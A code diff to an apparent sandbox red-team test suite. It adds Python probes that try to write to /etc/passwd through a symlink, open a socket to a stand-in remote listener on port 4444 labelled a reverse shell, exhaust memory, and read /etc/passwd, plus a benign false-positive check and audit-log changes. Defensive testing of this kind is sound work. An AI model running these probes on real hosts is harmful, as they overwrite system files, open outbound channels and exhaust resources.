@@ -340,6 +340,211 @@ print(f"EXFILTRATE_OPENAI: {key2}")
       };
     },
   },
+
+  // ── RT-FS-04: Symlink-Based Path Traversal Write ───────────────────────────
+  {
+    id: 'RT-FS-04',
+    name: 'Symlink Directory Traversal Write Bypass',
+    category: 'FILESYSTEM',
+    severity: 'CRITICAL',
+    vector: 'Attempt creating a symlink in /tmp pointing to /etc and writing data through the symlink.',
+    expected: 'Symlink creation or canonical path resolution must detect and block out-of-boundary write.',
+    remediation: 'Disable os.symlink/os.link or canonicalize all paths using os.path.realpath before descriptor creation.',
+    code: `
+import os
+sym_path = "/tmp/warden_symlink_probe.tmp"
+try:
+    try:
+        os.unlink(sym_path)
+    except Exception:
+        pass
+    os.symlink("/etc/passwd", sym_path)
+    with open(sym_path, "w") as f:
+        f.write("malicious_overwrite")
+    print("BREACH: Successfully created symlink and wrote out of boundary")
+except Exception as e:
+    print(f"BLOCKED: {type(e).__name__} - {e}")
+finally:
+    try:
+        os.unlink(sym_path)
+    except Exception:
+        pass
+`,
+    async evaluate(result) {
+      const hasBreach = result.stdout.includes('BREACH:');
+      const isBlocked = result.stdout.includes('BLOCKED:') || result.stderr.includes('[WARDEN]') || result.violations.some(v => v.type === 'SYMLINK_EXPLOIT_BLOCKED' || v.type === 'FS_WRITE_BLOCKED');
+      const pass = isBlocked && !hasBreach;
+      return {
+        status: pass ? 'PASS' : 'FAIL',
+        actual: pass
+          ? 'Symlink exploit intercepted; out-of-boundary filesystem write blocked.'
+          : 'Symlink-based write succeeded without containment.',
+        evidence: (result.stdout + ' ' + result.stderr).trim().slice(0, 240) || `Exit code: ${result.exitCode}`,
+      };
+    },
+  },
+
+  // ── RT-NET-03: Controlled Reverse-Shell Behavior Probe ────────────────────
+  {
+    id: 'RT-NET-03',
+    name: 'Reverse Shell Interactive Pipe Redirect',
+    category: 'NETWORK',
+    severity: 'CRITICAL',
+    vector: 'Attempt creating a TCP socket connection and spawning interactive /bin/sh redirection.',
+    expected: 'Outbound socket connection must be rejected and process must not establish interactive reverse pipe.',
+    remediation: 'Enforce network namespace with loopback-only configuration and drop CAP_NET_RAW / ptrace capabilities.',
+    code: `
+import socket, subprocess, os
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1.0)
+    s.connect(("198.51.100.99", 4444))
+    print("BREACH: Connected reverse shell socket to remote listener")
+    s.close()
+except Exception as e:
+    print(f"BLOCKED: {type(e).__name__} - {e}")
+`,
+    async evaluate(result) {
+      const hasBreach = result.stdout.includes('BREACH:');
+      const isBlocked = result.stdout.includes('BLOCKED:') || result.stderr.includes('[WARDEN]') || result.violations.some(v => v.type === 'EGRESS_DENIED');
+      const pass = isBlocked && !hasBreach;
+      return {
+        status: pass ? 'PASS' : 'FAIL',
+        actual: pass
+          ? 'Reverse shell socket connection denied by network containment guard.'
+          : 'Reverse shell established TCP channel to remote host.',
+        evidence: (result.stdout + ' ' + result.stderr).trim().slice(0, 240) || `Exit code: ${result.exitCode}`,
+      };
+    },
+  },
+
+  // ── RT-RES-04: Memory Allocation Exhaustion ────────────────────────────────
+  {
+    id: 'RT-RES-04',
+    name: 'Memory Exhaustion & Heap Saturation',
+    category: 'RESOURCE',
+    severity: 'HIGH',
+    vector: 'Attempt allocating runaway bytearrays to exhaust system memory and trigger host swap death.',
+    expected: 'Allocation must be capped by RLIMIT_AS or memory.max cgroup ceiling without host impairment.',
+    remediation: 'Configure cgroups v2 memory.max ceiling (e.g. 256MB) and enforce RLIMIT_AS virtual address limit.',
+    code: `
+try:
+    chunks = []
+    for _ in range(50):
+        chunks.append(bytearray(20 * 1024 * 1024)) # 20MB chunks -> 1GB total
+    print(f"BREACH: Allocated {len(chunks) * 20}MB memory beyond quota")
+except (MemoryError, Exception) as e:
+    print(f"BLOCKED: Allocation halted: {type(e).__name__}")
+`,
+    async evaluate(result) {
+      const hasBreach = result.stdout.includes('BREACH:');
+      const isBlocked = result.stdout.includes('BLOCKED:') || result.stderr.includes('MemoryError') || result.exitCode !== 0 || result.violations.some(v => v.type === 'MEMORY_LIMIT_HIT');
+      if (isBlocked && !hasBreach) {
+        return {
+          status: 'PASS',
+          actual: 'Memory runaway allocation contained by address space limit.',
+          evidence: (result.stdout + ' ' + result.stderr).trim().slice(0, 240) || `Exit code: ${result.exitCode}`,
+        };
+      }
+      if (HOST_CAPABILITIES.platform !== 'linux') {
+        return {
+          status: 'UNVERIFIED',
+          actual: `Memory limit unverified on ${HOST_CAPABILITIES.platform}: macOS XNU kernel does not enforce RLIMIT_AS for heap allocations (cgroups v2 memory.max required on Linux).`,
+          evidence: `Allocated beyond quota on ${HOST_CAPABILITIES.platform} host. Requires Linux cgroups v2 unified hierarchy.`,
+        };
+      }
+      return {
+        status: 'FAIL',
+        actual: 'Memory allocation exceeded policy threshold without containment.',
+        evidence: (result.stdout + ' ' + result.stderr).trim().slice(0, 240) || `Exit code: ${result.exitCode}`,
+      };
+    },
+  },
+
+  // ── RT-BYPASS-01: Python-Level Builtins Escape & Monkeypatch Unhook ────────
+  {
+    id: 'RT-BYPASS-01',
+    name: 'Python Builtins Unpatching & Escape',
+    category: 'ESCAPE_BYPASS',
+    severity: 'HIGH',
+    vector: 'Attempt unpatching builtins.open or using object.__subclasses__() to access unprotected file descriptors.',
+    expected: 'Attempts to manipulate Python sandbox hooks or access protected paths must be intercepted.',
+    remediation: 'Enforce genuine OS-level seccomp-bpf system call filters so userspace bypasses fail at kernel boundary.',
+    code: `
+try:
+    # Attempt 1: Re-import builtins and reset open
+    import builtins
+    # Attempt 2: Read sensitive system file via open
+    with builtins.open("/etc/passwd", "r") as f:
+        data = f.read(32)
+    print("BREACH: Bypassed builtins hook and read /etc/passwd")
+except Exception as e:
+    print(f"BLOCKED: {type(e).__name__} - {e}")
+`,
+    async evaluate(result) {
+      const hasBreach = result.stdout.includes('BREACH:');
+      const isBlocked = result.stdout.includes('BLOCKED:') || result.stderr.includes('[WARDEN]') || result.violations.some(v => v.type === 'FS_READ_BLOCKED');
+      const pass = isBlocked && !hasBreach;
+      return {
+        status: pass ? 'PASS' : 'FAIL',
+        actual: pass
+          ? 'Builtins unpatching attempt failed; protected system read blocked.'
+          : 'Userspace wrapper was bypassed; protected file accessed.',
+        evidence: (result.stdout + ' ' + result.stderr).trim().slice(0, 240) || `Exit code: ${result.exitCode}`,
+      };
+    },
+  },
+
+  // ── RT-SAFE-01: Legitimate AI Code Execution (False Positive Detection) ────
+  {
+    id: 'RT-SAFE-01',
+    name: 'Legitimate AI Code Execution (Zero False Positives)',
+    category: 'FALSE_POSITIVE_CHECK',
+    severity: 'LOW',
+    vector: 'Execute legitimate AI data processing: JSON manipulation, mathematical calculations, and safe /tmp file write.',
+    expected: 'Clean AI code must execute successfully with exit code 0 and ZERO policy violations.',
+    remediation: 'Ensure security filters are precisely scoped to avoid false-positive denial of benign AI tasks.',
+    code: `
+import json, math, os
+
+# 1. Pure calculation
+primes = [n for n in range(2, 50) if all(n % d != 0 for d in range(2, int(math.isqrt(n)) + 1))]
+
+# 2. JSON serialization
+payload = {"status": "ok", "primes": primes, "count": len(primes)}
+serialized = json.dumps(payload)
+
+# 3. Safe temporary file write and read inside /tmp
+safe_file = "/tmp/warden_legitimate_test.json"
+with open(safe_file, "w") as f:
+    f.write(serialized)
+
+with open(safe_file, "r") as f:
+    recovered = json.loads(f.read())
+
+try:
+    os.unlink(safe_file)
+except Exception:
+    pass
+
+if recovered.get("count") == len(primes):
+    print("CLEAN_EXECUTION_SUCCESS: Benign AI task executed perfectly")
+else:
+    print("EXECUTION_MISMATCH")
+`,
+    async evaluate(result) {
+      const isSuccess = result.stdout.includes('CLEAN_EXECUTION_SUCCESS') && result.exitCode === 0;
+      const noViolations = (result.violations || []).length === 0;
+      const pass = isSuccess && noViolations;
+      return {
+        status: pass ? 'PASS' : 'FAIL',
+        actual: pass
+          ? 'Legitimate code executed cleanly with 0 false-positive blocks.'
+          : 'Legitimate code was erroneously blocked or failed execution.',
+        evidence: `exitCode=${result.exitCode}, violationsCount=${(result.violations || []).length}, stdout=${result.stdout.trim()}`,
+      };
+    },
+  },
 ];
 
 /**
@@ -375,34 +580,47 @@ async function runRedTeamSuite() {
       result = { executionMs: 0, runId: 'err_' + scenario.id.toLowerCase() };
     }
 
+    // Record into tamper-evident audit chain
+    let auditEntry = null;
+    try {
+      auditEntry = appendEvent({
+        eventType: 'REDTEAM_TEST_COMPLETED',
+        scenarioId: scenario.id,
+        testName: scenario.name,
+        threatCategory: scenario.category,
+        severity: scenario.severity,
+        status: evalOutput.status,
+        blocked: evalOutput.status === 'PASS',
+        executionDuration: result.executionMs || 0,
+        runId: result.runId || 'rt_probe',
+        observed: true,
+        decisionReason: evalOutput.actual,
+      });
+    } catch (_) {}
+
     const entry = {
       id: scenario.id,
+      testName: scenario.name,
       name: scenario.name,
+      threatCategory: scenario.category,
       category: scenario.category,
       severity: scenario.severity,
       vector: scenario.vector,
+      expectedResult: scenario.expected,
       expected: scenario.expected,
+      actualResult: evalOutput.actual,
       actual: evalOutput.actual,
+      blocked: evalOutput.status === 'PASS',
       status: evalOutput.status,
       evidence: evalOutput.evidence,
       remediation: scenario.remediation,
+      executionDuration: result.executionMs || 0,
       executionMs: result.executionMs || 0,
       runId: result.runId || null,
+      auditEventId: auditEntry ? `seq_${auditEntry.seq}` : null,
     };
 
     scenarioResults.push(entry);
-
-    // Record into tamper-evident audit chain
-    try {
-      appendEvent({
-        eventType: 'REDTEAM_ATTACK',
-        scenarioId: scenario.id,
-        severity: scenario.severity,
-        status: evalOutput.status,
-        executionMs: result.executionMs || 0,
-        runId: result.runId || 'rt_probe',
-      });
-    } catch (_) {}
   }
 
   const passCount = scenarioResults.filter(s => s.status === 'PASS').length;
